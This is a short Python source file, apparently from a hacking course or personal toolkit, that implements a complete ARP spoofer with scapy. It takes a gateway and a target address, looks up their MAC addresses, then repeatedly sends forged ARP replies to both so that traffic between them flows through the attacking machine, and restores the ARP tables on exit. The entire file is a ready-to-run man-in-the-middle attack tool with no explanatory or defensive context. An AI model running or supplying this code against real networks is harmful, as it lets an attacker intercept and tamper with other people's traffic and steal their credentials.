import time
import scapy.all as scapy
import argparse

def get_arguments():
    parser = argparse.ArgumentParser(description = "ARP spoofer script")
    parser.add_argument("-g", "--gateway", dest = "gateway", help = "Gateway")
    parser.add_argument("-t", "--target", dest = "target", help = "Target")
    args = parser.parse_args()

    if not args.gateway:
        parser.error("[-] Please specify the gateway, use --help for more info.")
    elif not args.target:
        parser.error("[-] Please specify the target, use --help for more info.")

    return args

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # op = 2 == arp response, op = 1 == arp request
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(packet, verbose = False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, count = 5, verbose = False)

args = get_arguments()
target_ip = args.target
gateway_ip = args.gateway

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r\033[94m[+]\033[0m Packets sent: " + str(sent_packets_count), end = "")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n\033[92m[+]\033[0m Restoring ARP table...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("\033[92m[+]\033[0m Done.")
    print("[+] Quitting.")
